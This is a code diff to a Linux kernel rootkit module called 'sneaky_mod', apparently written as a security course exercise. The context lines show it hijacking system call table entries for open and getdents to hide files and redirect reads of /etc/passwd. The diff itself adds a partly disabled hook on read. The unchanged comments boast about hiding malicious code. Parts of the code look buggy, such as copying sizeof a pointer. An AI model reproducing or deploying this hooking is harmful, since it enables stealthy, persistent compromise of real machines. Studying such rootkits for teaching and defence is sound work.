@@ -36,6 +36,7 @@ static int pid = 0;
 module_param(pid, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
 char *processname = "sneaky_process";
 char *filename = "/tmp/passwd";
+char *modename = "sneaky_mod";
 struct linux_dirent64 {
   u64 d_ino;               /* 64-bit inode number */
   s64 d_off;               /* 64-bit offset to next structure */
@@ -57,7 +58,13 @@ asmlinkage int (*original_call)(const char *pathname, int flags);
 asmlinkage long (*orig_getdents)(unsigned int fd,
                                  struct linux_dirent64 __user *dirp,
                                  unsigned int count);
+asmlinkage ssize_t (*orig_read)(unsigned int fd, char __user *buf,
+                                size_t count);
 
+asmlinkage ssize_t sneaky_sys_read(unsigned int fd, char __user *buf,
+                                   size_t count) {
+  return (*orig_read)(fd, buf, count);
+}
 static int atoi(char *num) {
   int res = 0;
   while (*num != '\0') {
@@ -102,7 +109,6 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
   if (strstr(pathname, "/etc/passwd") != NULL) {
     copy_to_user((void *)pathname, filename, sizeof(filename));
   }
-  printk(KERN_INFO "pathname:%s\n", pathname);
   return original_call(pathname, flags);
 }
 
@@ -124,8 +130,10 @@ static int initialize_sneaky_module(void) {
   // table with the function address of our new code.
   original_call = (void *)*(sys_call_table + __NR_open);
   orig_getdents = (void *)*(sys_call_table + __NR_getdents);
+  orig_read = (void *)*(sys_call_table + __NR_read);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
   *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
+  //*(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
   // Revert page to read-only
   pages_ro(page_ptr, 1);
   // Turn write protection mode back on
@@ -152,6 +160,7 @@ static void exit_sneaky_module(void) {
   // function address. Will look like malicious code was never there!
   *(sys_call_table + __NR_open) = (unsigned long)original_call;
   *(sys_call_table + __NR_getdents) = (unsigned long)orig_getdents;
+  *(sys_call_table + __NR_read) = (unsigned long)orig_read;
   // Revert page to read-only
   pages_ro(page_ptr, 1);
   // Turn write protection mode back on
